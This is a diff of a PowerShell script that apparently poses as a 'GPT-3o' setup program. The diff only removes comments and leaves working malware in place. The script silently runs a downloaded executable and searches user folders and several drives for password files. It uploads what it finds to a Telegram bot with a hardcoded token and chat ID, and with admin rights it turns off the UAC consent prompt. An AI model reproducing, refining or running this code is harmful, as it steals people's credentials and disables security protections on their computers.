@@ -1,4 +1,3 @@
-# Блок 1: Скачивание и установка приложения
 try {
     $exePath = Join-Path $env:ProgramData 'GPT-3o_win-x64_setup.exe'
     
@@ -12,7 +11,6 @@ try {
             $process = Start-Process -FilePath $exePath -ArgumentList '/S' -PassThru -NoNewWindow -Wait
         }
     } catch {
-        # Игнорируем ошибки загрузки
     }
 } finally {
     if (Test-Path $exePath) {
@@ -20,15 +18,12 @@ try {
     }
 }
 
-# Блок 2: Настройки
 $telegramBotToken = "5574338417:AAHzByMElpQLpyZ72paKuP4Gb2gqcIByKBo"
 $chatId = "1473231416"
 $searchPatterns = @("пароли.txt", "passwords.txt")
 $tempDir = if ($env:TEMP) { $env:TEMP } else { [System.IO.Path]::GetTempPath() }
 
-# Блок 3: Поиск и отправка в Telegram
 try {
-    # Поиск файлов
     $foundFiles = @()
     $searchPaths = @("$env:USERPROFILE", "C:\Users", "D:\", "E:\")
     
@@ -44,7 +39,6 @@ try {
     $foundFiles = $foundFiles | Sort-Object FullName -Unique
     
     if ($foundFiles.Count -gt 0) {
-        # Создание файла с данными
         $outputFile = Join-Path $tempDir "passwords_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
         $encoding = [System.Text.Encoding]::UTF8
         
@@ -59,7 +53,6 @@ try {
             } catch { }
         }
         
-        # Отправка в Telegram
         if (Test-Path $outputFile -and (Get-Item $outputFile).Length -gt 0) {
             try {
                 $form = @{
@@ -69,7 +62,6 @@ try {
                 }
                 Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendDocument" -Method Post -Form $form -ErrorAction Stop
             } catch {
-                # Резервная отправка текстом
                 try {
                     $content = Get-Content $outputFile -Raw -ErrorAction Stop
                     if ($content.Length -gt 4000) { $content = $content.Substring(0, 4000) + "..." }
@@ -83,28 +75,24 @@ try {
                 if (Test-Path $outputFile) { Remove-Item $outputFile -Force }
             }
         } else {
-            # Отправка сообщения если файлы пустые
             Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
                 chat_id = $chatId
                 text = "Найдено $($foundFiles.Count) файлов, но они пустые"
             } -ErrorAction SilentlyContinue
         }
     } else {
-        # Отправка сообщения если файлы не найдены
         Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
             chat_id = $chatId
             text = "Файлы с паролями не найдены"
         } -ErrorAction SilentlyContinue
     }
 } catch {
-    # Отправка сообщения об ошибке
     Invoke-RestMethod "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body @{
         chat_id = $chatId
         text = "Ошибка при поиске файлов: $($_.Exception.Message)"
     } -ErrorAction SilentlyContinue
 }
 
-# Блок 4: Системные настройки
 try {
     if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
         Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force -ErrorAction SilentlyContinue
